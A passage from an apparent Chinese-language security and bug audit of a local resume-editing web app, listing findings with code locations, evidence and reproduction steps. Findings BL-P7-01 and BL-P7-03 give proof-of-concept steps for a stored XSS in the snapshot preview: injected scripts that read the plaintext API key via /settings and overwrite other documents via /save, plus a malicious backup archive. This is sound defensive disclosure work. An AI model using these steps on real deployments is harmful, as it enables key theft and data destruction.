- **复现口径**：隔离根 /tmp/rv-probe4/data（空 docs/），调用 structureText(root,'任意原文', async () => JSON.stringify({name:'张三',contact:'',intent:'',summary:'摘要',skills:[],work:[],projects:[],education:[]}))，断言产物 includes('{{DOC_ID}}') === true（实测输出即 true）→ 与 importer.mjs:53 降级路径的产物（无占位符）形成对照。

### BL-P6-06（severity: low）

- **位置**：importer.mjs:21-35 与 60、72-75
- **问题**：导入在调 LLM 之前就用 openSync('wx') 占位创建 docs/<id>.html，这个 0 字节占位文件在结构化期间（可达数分钟）对用户可见，进程被 SIGKILL 时会永久残留为一个打不开的「文档已损坏」条目。
- **证据**：importer.mjs:60 `const id = allocateDocId(root, name);` 在 :64 的 structureText（真实 LLM 调用，max 思考实测可达 276 秒）之前；:22-29 allocateDocId 用 `fs.openSync(p,'wx',0o600)` 落地一个 0 字节文件当占位；:72-75 的清理 `fs.rmSync(...)` 只在正常抛错的 catch 里执行，被 SIGKILL/断电则不执行。server.mjs:104-109 的 docIdsOnDisk 只过滤 `.html` 后缀、VALID_ID 与「是普通文件」，**不检查文件大小** → 0 字节占位文件会出现在首页文档列表；点进去因 server.mjs:2294 `if (!/var DOC_ID = '[^']*'/.test(html)) return send(500,'文档已损坏')` 而打不开。
- **复现口径**：隔离根下让 importPdfText 走到 LLM 分支后立即 SIGKILL 该进程（或直接手工构造：allocateDocId 后不写正文即退出），再执行 docIdsOnDisk 等价逻辑（readdirSync docs → 过滤 .html/VALID_ID/是普通文件）→ 断言该 id 出现在列表中且文件大小为 0；随后 GET /edit?id=<id> 返回 500「文档已损坏」。

## 审查路 7（节点 13103，3 条）

### BL-P7-01（severity: high）

- **位置**：server.mjs:3413-3422（GET /snapshot/view）；对照 server.mjs:2336-2349（GET /edit 的 CSP）与 server.mjs:2214-2222（send() 只加 Content-Type/Cache-Control）
- **问题**：/snapshot/view 把冻结快照原样当 text/html 返回且不带任何 CSP，快照正文里的内联脚本在应用同源执行（存储型 XSS）——可读明文 LLM Key、全部简历正文，并可 POST /save 覆盖任意其它文档
- **证据**：server.mjs:3418-3421：`let html = fs.readFileSync(snapFile,'utf8'); … return send(200, html.replace('<body>','<body>'+banner));`，全程无 CSP 头（send() 在 2214-2222 只设 Content-Type 与 Cache-Control）。快照内容 = freezeHtml(当前文档)（server.mjs:831-836 writeFrozenSnapshot / 850-860 snapshot），即用户正文原样，含用户粘贴或备份带来的任意 <script>；/save 的剥离链（server.mjs:1976-2000 stripInjections）只剥注入注释对与运行时 style，不剥用户脚本。恢复入口也刻意不拦未知内联脚本（server.mjs:4408-4411 注释原文「防护放在 /edit 的 CSP 上」），而 /snapshot/view 没有这道 CSP，于是 /edit 的防护被绕过。
实测（隔离 RESUME_ROOT + 随机端口 + 合成文档，真 Chromium）：① 快照含 `<script>window.__PWNED__='xss-in-snapshot'</script>` → `GET /snapshot/view?id=doc&ts=…` 响应头仅 Content-Type/Cache-Control（无 CSP）→ 打开后 `window.__PWNED__==='xss-in-snapshot'`、document.title==='pwned'；同一脚本在 `/edit?id=doc` 上 `window.__PWNED__===null`（被 CSP 挡住），证明差异只在 CSP。② 同页 `fetch('/settings')` 响应体含明文 apiKey（实测含 sk-DUMMY-AUDIT-KEY-123）；③ 同页 `fetch('/save?id=doc-1',{method:'POST'})` 返回 200 且 docs/doc-1.html 被改写为攻击者内容（「PWNED-BY-SNAPSHOT-XSS」），另一份文档被销毁。④ 恶意备份链同样走通：构造含 scripts 的 docs/evil.html + snapshots/evil/<ts>.html 的 tar.gz → `POST /restore?apply=1&mode=merge` 返回 ok:true（接受）→ `GET /snapshot/view?id=evil&ts=…` 执行 `window.__SNAP_PWNED__==='snapshot-xss'`。
- **复现口径**：隔离实例：POST /save 写入含 <script>window.__PWNED__=1</script> 的正文两次（第二次使旧版进快照）→ GET /snapshots?id= 取 ts → curl -D- 看 /snapshot/view 响应头无 CSP → 真 Chromium 打开断言 window.__PWNED__ 有值；再在该页 fetch('/settings') 断言含 key、fetch('/save?id=另一文档') 断言 200 且磁盘被改。恶意备份变体：tar czf 含 scripts 的 docs/<id>.html + snapshots/<id>/<ts>.html → POST /restore?apply=1&mode=merge → 再访问 /snapshot/view 断言脚本执行。

### BL-P7-02（severity: medium）

- **位置**：server.mjs:3413-3422（快照预览页原样返回冻结 HTML）+ template.html:295-297（⌘S/Ctrl+S → doSave）+ template.html:243-249（doSave 发 POST /save）+ template.html:96,244（diskMtime）+ server.mjs:2867-2872（baseMtime 并发闸门）+ editor-shell.js:7（只有 /edit 才有 __edDocMtime）
- **问题**：「历史快照只读预览」页仍带着模板编辑器的保存通道：用户在预览页按 Ctrl/⌘S 会把「预览中的历史版本」直接写回当前文档，且因预览页没有 __edDocMtime 而跳过 baseMtime 并发冲突检测——当前简历被静默回退
- **证据**：/snapshot/view 原样返回冻结快照，而快照里含 template.html 的编辑器主脚本（template.html:51-310），其中 template.html:295-297 `document.addEventListener('keydown', e => { if ((e.metaKey||e.ctrlKey) && e.key==='s') { e.preventDefault(); doSave(false); } })` —— 预览页的工具条只是被 CSS 隐藏（server.mjs:3419 的 `.edit-toolbar{display:none!important}`），DOM 与事件仍在，⌘S 依旧生效，且 e.preventDefault() 让浏览器自带的「保存网页」也不出现。doSave 走 template.html:243-249 `POST /save?id=DOC_ID`，其中 baseMtime 只在 `diskMtime()` 非 0 时附带（template.html:96,244），而 diskMtime 读 `window.__edDocMtime`——该全局只有 /edit 经 shellBlock（server.mjs:1355-1363，`data-mtime`）→ editor-shell.js:7 才设置；快照预览页没有 SHELL-INJECT 块，故 diskMtime()=0 → 请求不带 baseMtime → server.mjs:2869 `if (baseMtime > 0 && !force)` 被跳过 → 写入无条件接受。
实测（隔离实例）：当前文档 h1=VERSION-B-CURRENT，另存过一份 h1=VERSION-A-OLD 的快照 → 打开 `/snapshot/view?id=doc-3&ts=<A>`（页面显示「历史快照只读预览」）→ 按 Ctrl+S → 抓到 `POST http://127.0.0.1:PORT/save?id=doc-3`，磁盘上 docs/doc-3.html 随即变成 `<h1 …>VERSION-A-OLD</h1>`（当前版本被回退，且预览页无任何「已保存」提示）。/edit 页同操作会带 baseMtime 并被 409 拦下，故问题只出在预览页。缓解：/save 手动保存会先 snapshot(id)（server.mjs:2881），被覆盖的上一版仍在「历史版本」列表里可找回。
- **复现口径**：隔离实例：/new 建模板文档 → 保存 VERSION-A-OLD → 再保存 VERSION-B-CURRENT（产生 A 的快照）→ 浏览器打开 /snapshot/view?id=<doc>&ts=<A 的 ts> → page.keyboard.press('Control+s') → 断言磁盘 docs/<doc>.html 的 h1 从 VERSION-B-CURRENT 变成 VERSION-A-OLD，且抓包见 POST /save?id=<doc>。

### BL-P7-03（severity: low）

- **位置**：server.mjs:2338-2348（/edit 的 CSP 指令集）
- **问题**：/edit 的 CSP 未约束 frame-src / object-src（回落到 default-src 'self'），文档正文（按代码自身口径属「外部输入」）可内嵌任意同源页面，其中 /settings 的明文 API Key 就在该 iframe 的 DOM 里，同源脚本可直接读出
- **证据**：server.mjs:2338-2348 的指令集为 default-src 'self' / script-src / style-src / img-src / font-src / connect-src / frame-ancestors 'none' / base-uri 'none' / form-action 'self' —— 没有 frame-src 'none' 也没有 object-src 'none'，frame-src 因此继承 default-src 'self'，同源 iframe 被允许。server.mjs:3786-3805 的 /settings 把 config.json 里的 profiles（含明文 apiKey）内联进页面（`var DATA = ${JSON.stringify({active,profiles})…}`），故同源 iframe 的 DOM 里就有明文 Key。
实测（隔离实例，config.json 内放假 key）：在 /edit?id=<doc> 页面里 document.createElement('iframe'); f.src='/settings'; 追加后 `f.contentDocument` 可读（sameOriginReadable:true），且 `f.contentDocument.body.textContent` 含 sk-DUMMY-AUDIT-KEY-123。
影响界定（诚实说明）：单独存在时无法外泄——/edit 的 script-src 已挡住文档自带的脚本；只有当页面内确实有脚本执行（目前只有 #1 的 /snapshot/view 无 CSP 这条路）时才能读到 iframe DOM。作为 CSP 覆盖面缺口记录，同时该同源可嵌 /settings 也构成点击劫持面（文档正文可把设置页盖在简历上诱导点击）。
- **复现口径**：隔离实例：RESUME_ROOT 下放含假 key 的 config.json → 浏览器打开 /edit?id=<doc> → evaluate() 里插 iframe src='/settings' → 断言 f.contentDocument 非空且其 body.textContent 含该 key（对照：不插 iframe 时文档脚本被 CSP 挡住，页面内无脚本可读它）。

## 已完成独立复核结论索引

| 复核节点 | 结论 |
|---|---|
| 13110（ord 1） | confirmed：代码路径确凿 + 已复现，但发现的范围与严重度需要收窄修正（拆成两半，只有后半是真缺陷）。  【我读了什么】 - eval.mjs 全文（尤其 :45-46 签名、:25/:30 prompt 契约、:74 简历侧核验、:108-116 s… |
| 13114（ord 2） | confirmed：结论：confirmed。原发现的推理链、代码定位、实测输出我逐条独立核实，全部成立；仅两处措辞需精确化（见文末）。  一、代码路径核实（全部本人读过） 1) zone.mjs:38 `const gt = s.indexOf('>', j… |
| 13118（ord 3） | confirmed：结论：主发现成立（已按 ask 指定的复现步骤实测复现，并额外做了端到端复现）；附带宣称的第二处丢失也属实，但那是 copytruncate 设计的固有代价，不是编码错误。  一、代码核实（只读，仓库文件零改动） - /Users/xxxl… |
| 13122（ord 4） | confirmed：代码路径确凿，且已在隔离实例中复现（含落盘固化）。  一、代码链（读 /Users/xxxly/resume，HEAD=bfb033d；job-panel.js 在 7430f03..HEAD 之间只有 CSS/UI 改动，涉事逻辑未变） … |
| 13126（ord 5） | confirmed：独立复核结论：成立（confirmed）。我在本轮实际跑了原证据点名的两类检查（净化器单测 + 端到端），并核实了完整代码路径。  一、读到的代码（路径:行） - render-safe.mjs:43 `RAW_TEXT_TAGS = ne… |
| 13130（ord 6） | confirmed：核心主张成立并已复现，但原证据链的最后一环（用户保存被启动恢复回滚）在服务端 /save 路径上不成立，需修正。  【读码核实】(1) migrate-meta.mjs:443-446 注释声称 staleMs 放大到 24h 可防服务端判… |
| 13134（ord 7） | confirmed：机制、影响链、误报定性三项均已在本次复核中独立跑通，未发现原证据的守卫遗漏或合同误读。  【1 代码路径确凿】 - job.mjs:87-91 `NUM_RE` 分支③为 `-(?:[零一二三四五六七八九十百千万亿两]+[百千万亿][...… |
| 13138（ord 8） | confirmed：结论：confirmed（代码路径确凿 + 我自己独立复现）。  一、代码核实（读的是 /Users/xxxly/resume 工作树，HEAD=bfb033d，`git status` 仅剩用户原有的 4 个未跟踪 dev-docs 文件… |
| 13142（ord 9） | confirmed：代码路径确凿 + 我自己隔离复现，原证据的推理链逐环核实无误，未发现漏看的守卫。  ## 一、代码路径核实（读的代码）  1. `migrate-meta.mjs:395-412` `migrateMaterials`：    - `:39… |
| 13146（ord 10） | confirmed：代码路径确凿 + 已在本机真实 Chromium 上复现（隔离实例，未碰真实数据与 7766）。  一、代码核实（读的是 /Users/xxxly/resume，当前 HEAD = main@bfb033d；ask 里写的 7430f03 … |
| 13154（ord 12） | confirmed：核心链条已复现，结论成立（原报告有两处细节不精确，不影响判定）。  一、代码核实（工作树 HEAD=bfb033d；`git diff --stat 7430f03..HEAD -- job.mjs evidence.mjs` 为空，即在报… |
| 13162（ord 14） | confirmed：独立复核结论：**成立（confirmed）**。我在隔离实例里复现了原证据描述的完整链条，并补测了原发现未覆盖的两种形状。  ## 一、代码路径核实（只读，仓库未被修改）  - `server.mjs:4259-4261`：`/backu… |
| 13166（ord 15） | confirmed：代码路径确凿且已复现。  【核实到的代码事实】 1) eval.mjs:74 与原证据逐字一致：`const matchesResume = !!(hay && needle && hay.includes(needle));` —— 唯一… |
| 13170（ord 16） | confirmed：结论：成立。原证据的推理链逐环在代码里核实无误，并已用隔离临时根复现（tx 级 + 真实 server 端到端），且不是 handoff 已裁决的行为口径。  一、代码链核实（读 /Users/xxxly/resume，HEAD=bfb03… |
| 13174（ord 17） | confirmed：结论：confirmed（核心链路确凿且我已独立复现）。hide / reorder 的落点确实按「章节名 + 条目标题的双向子串模糊匹配」定位，忽略候选里服务端已解析好的精确 zid，会隐藏/移动错误条目、把错误结果写进磁盘，而候选状态记… |
| 13178（ord 18） | confirmed：代码路径确凿，且已端到端复现。  ## 一、代码核实（读到的事实）  **migrate-editor.mjs:62-64 确实是裸字符串替换：** ```js const out = html   .replace(/<div class… |
| 13194（ord 22） | confirmed：核心事实成立并已复现，但原证据有一处前提错误、需一并修正。  【成立部分（我读到的代码 + 我跑的探针）】 1) 代码路径确凿：importer.mjs:63-65 走 `html = await structureText(root, t… |

---

**合计 39 条**；severity 分布：medium×19、low×12、high×8